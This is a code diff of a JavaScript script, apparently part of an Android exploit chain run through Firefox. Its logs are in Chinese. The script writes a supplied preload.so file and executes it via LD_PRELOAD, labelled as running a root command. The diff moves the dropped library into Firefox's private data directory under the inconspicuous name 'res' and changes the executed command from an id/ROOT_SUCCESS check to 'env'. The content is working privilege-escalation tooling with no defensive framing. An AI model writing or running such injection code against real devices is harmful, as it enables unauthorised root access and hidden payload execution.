@@ -519,6 +519,8 @@ function shellQuote(value) {
   return "'" + String(value).replace(/'/g, "'\\''") + "'";
 }
 
+const PRIVATE_DIR = "/data/data/org.mozilla.firefox/files";
+
 async function main() {
   if (!preloadSoData) {
     logErr('请先选择 preload.so 文件');
@@ -959,11 +961,11 @@ async function main() {
   // ── Stage 7: Write preload.so and execute ──
   logInfo('[7/7] 写入 preload.so 并执行 Root 命令...');
 
-  const PRELOAD_TARGET = "/data/local/tmp/preload.so";
+  const PRELOAD_TARGET = PRIVATE_DIR + "/res";
 
   // Create target directory and empty file
   const initWriteResult = runCaptureCommand(
-    "dir=/data/local/tmp" +
+    "dir=" + shellQuote(PRIVATE_DIR) +
       "; file=" + shellQuote(PRELOAD_TARGET) +
       "; /system/bin/mkdir -p \"$dir\"" +
       " && : > \"$file\"" +
@@ -1017,10 +1019,10 @@ async function main() {
 
   // Execute with LD_PRELOAD
   const ROOT_CMD = "id; echo ROOT_SUCCESS";
-  logInfo('执行: LD_PRELOAD=' + PRELOAD_TARGET + ' /system/bin/sh -c "' + ROOT_CMD + '"');
+  logInfo('执行: LD_PRELOAD=' + PRELOAD_TARGET + ' env');
 
-  const commandOutputTarget = "/data/local/tmp/result";
-  const commandDoneTarget = "/data/local/tmp/result.done";
+  const commandOutputTarget = PRIVATE_DIR + "/result";
+  const commandDoneTarget = PRIVATE_DIR + "/result.done";
 
   const initCommandResult = runCaptureCommand(
     "out=" + shellQuote(commandOutputTarget) +
@@ -1037,7 +1039,7 @@ async function main() {
     "file=" + shellQuote(PRELOAD_TARGET) +
       "; out=" + shellQuote(commandOutputTarget) +
       "; done=" + shellQuote(commandDoneTarget) +
-      "; { LD_PRELOAD=\"$file\" /system/bin/sh -c " + shellQuote(ROOT_CMD) + "; status=$?; } >> \"$out\" 2>&1" +
+      "; { LD_PRELOAD=\"$file\" env; status=$?; } >> \"$out\" 2>&1" +
       "; /system/bin/printf %s \"$status\" > \"$done\"",
     12
   );
